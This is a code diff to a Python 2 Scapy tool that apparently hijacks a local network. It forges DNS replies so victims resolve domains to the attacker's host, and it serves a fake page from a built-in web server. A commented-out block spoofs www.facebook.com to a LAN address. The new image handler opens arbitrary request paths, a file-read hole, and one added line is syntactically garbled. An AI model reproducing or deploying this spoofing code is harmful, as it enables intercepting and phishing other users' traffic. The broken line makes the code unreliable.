@@ -1,7 +1,10 @@
 from scapy.all import *
+from BaseHTTPServer import BaseHTTPRequestHandler
+from StringIO import StringIO
 import sys
 import socket
 import os
+import re
 
 block_ip = []
 send_page = None
@@ -13,9 +16,16 @@ page_data = ""
 
 is_blocked = False
 
-def readall(path):
-	file = open(path,'r')
-	return file.read()
+
+class HTTPRequest(BaseHTTPRequestHandler):
+	def __init__(self, request):
+		self.rfile = StringIO(request)
+		self.raw_requestline = self.rfile.readline()
+		self.error_code = self.error_message = None
+		self.parse_request()
+
+	def send_error(self, code, message):
+		self.error_code = codeself.error_message = message
 
 
 def steal(packet):
@@ -55,13 +65,19 @@ def openWebserver(pagetoSend=PAGE):
 		conn, addr = s.accept()
 		data = conn.recv(2048)
 
-
-		message = ["HTTP/1.1 200 OK",
-		"Server: barlistener (Linux)",
-		"Content-Type: text/html",
-		"",
-		page]
-
+		request = HTTPRequest(data)
+		
+		if request != None and request.command != None and "GET" in request.command:
+			message = ["HTTP/1.1 200 OK", "Server: barlistener (Linux)"]
+			if "imgs/" in request.path.lower():
+				match = re.search(r"imgs\/.+",request.path).group()
+				message += ["Content-Type: image/jpeg",
+							"",
+							open(match,'r').read()]
+			else:
+				message += ["Content-Type: text/html",
+							"",
+							page]	
 
 		message_str = "\r\n".join(message)
 		conn.send(message_str)
@@ -76,6 +92,7 @@ def action(packet):
 	SYN = 0x2
 	ACK = 0x10
 
+	#print "%s %s" % (packet[IP].dst, DNS in packet)
 	if steal(packet):
 		if UDP in packet and DNS in packet:
 			odns = packet[DNS]
@@ -84,10 +101,15 @@ def action(packet):
 				qd=DNSQR(qname=odns.qd.qname, qtype='A', qclass='IN'))
 			udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
 			ip = IP(dst = packet[IP].src, src = packet[IP].dst)
-			
 			send(ip/udp/dns,verbose=0)
-		#if packet[IP].dst == "192.168.1.103":
-		#	print "someone tries to connect"
+		#elif TCP in packet:
+		#	dns = DNS(ancount=1, qdcount=1, qr=1, opcode="QUERY", rd=1, ra=1, rcode="ok",
+		#		an=DNSRR(rrname="www.facebook.com.", type='A', rdlen=4, rclass='IN', rdata="192.168.1.103", ttl=1234),
+		#		qd=DNSQR(qname="www.facebook.com.", qtype='A', qclass='IN'))
+		#	udp = UDP(sport=packet[TCP].dport, dport=53)
+		#	ip = IP(dst = packet[IP].src, src = packet[IP].dst)
+		#	send(ip/udp/dns,verbose=0)
+		#	print "Facebook"
 	
 				
 
@@ -112,8 +134,6 @@ def main(argv):
 	gateway_ip = argv[5]
 	my_mac = argv[3]
 	gateway_mac = argv[4]
-	
-	page_data = readall(send_page)
 
 	f = os.fork()
 
